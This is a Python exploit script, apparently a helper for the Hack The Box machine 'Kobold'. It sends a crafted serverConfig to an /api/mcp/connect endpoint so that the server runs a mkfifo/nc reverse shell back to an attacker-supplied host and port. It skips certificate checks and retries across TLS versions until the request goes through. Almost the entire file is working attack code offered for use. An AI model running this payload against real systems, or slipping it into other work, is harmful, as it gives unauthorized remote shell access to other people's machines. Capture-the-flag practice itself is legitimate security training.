#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════╗
# ║           MAVERICK - MCP RCE TLS Prober             ║
# ║         HTB Kobold - Writeup Helper Script          ║
# ╚══════════════════════════════════════════════════════╝

import requests
import ssl
import urllib3
import argparse

urllib3.disable_warnings()

BANNER = """
███╗   ███╗ █████╗ ██╗   ██╗███████╗██████╗ ██╗ ██████╗██╗  ██╗
████╗ ████║██╔══██╗██║   ██║██╔════╝██╔══██╗██║██╔════╝██║ ██╔╝
██╔████╔██║███████║██║   ██║█████╗  ██████╔╝██║██║     █████╔╝ 
██║╚██╔╝██║██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██║     ██╔═██╗ 
██║ ╚═╝ ██║██║  ██║ ╚████╔╝ ███████╗██║  ██║██║╚██████╗██║  ██╗
╚═╝     ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝
         HTB Kobold - MCP RCE TLS Version Prober
"""

TLS_VERSIONS = [
    ("TLSv1.2", ssl.TLSVersion.TLSv1_2),
    ("TLSv1.3", ssl.TLSVersion.TLSv1_3),
    ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
    ("TLSv1.0", ssl.TLSVersion.TLSv1),
]

def make_session(tls_version):
    session = requests.Session()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.minimum_version = tls_version
    ctx.maximum_version = tls_version

    class TLSAdapter(requests.adapters.HTTPAdapter):
        def init_poolmanager(self, *args, **kwargs):
            kwargs['ssl_context'] = ctx
            super().init_poolmanager(*args, **kwargs)

    session.mount("https://", TLSAdapter())
    return session

def try_rce(target, lhost, lport, tls_label, session):
    url = f"https://{target}/api/mcp/connect"
    payload = {
        "serverConfig": {
            "command": "sh",
            "args": [
                "-c",
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
            ],
            "env": {}
        },
        "serverId": "maverick_rce"
    }
    try:
        resp = session.post(url, json=payload, timeout=10, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="MAVERICK - HTB Kobold MCP RCE Script")
    parser.add_argument("--target", required=True, help="Target host (e.g. mcp.kobold.htb)")
    parser.add_argument("--lhost", required=True, help="Your HTB tun0 IP")
    parser.add_argument("--lport", default="4444", help="Listener port (default: 4444)")
    args = parser.parse_args()

    print(f"[*] Target  : https://{args.target}")
    print(f"[*] LHOST   : {args.lhost}")
    print(f"[*] LPORT   : {args.lport}")
    print(f"[*] Start your listener: nc -lvnp {args.lport}\n")

    for label, version in TLS_VERSIONS:
        print(f"[~] Trying TLS version: {label} ...", end=" ")
        try:
            session = make_session(version)
            status, body = try_rce(args.target, args.lhost, args.lport, label, session)
            if status and status < 500:
                print(f"✓ Got response! (HTTP {status})")
                print(f"[+] TLS {label} worked! Check your listener.")
                print(f"[+] Response: {body[:200]}")
                break
            else:
                print(f"✗ Failed (HTTP {status})")
        except Exception as e:
            print(f"✗ Error: {e}")
    else:
        print("\n[-] All TLS versions failed. Check target/network.")

if __name__ == "__main__":
    main()
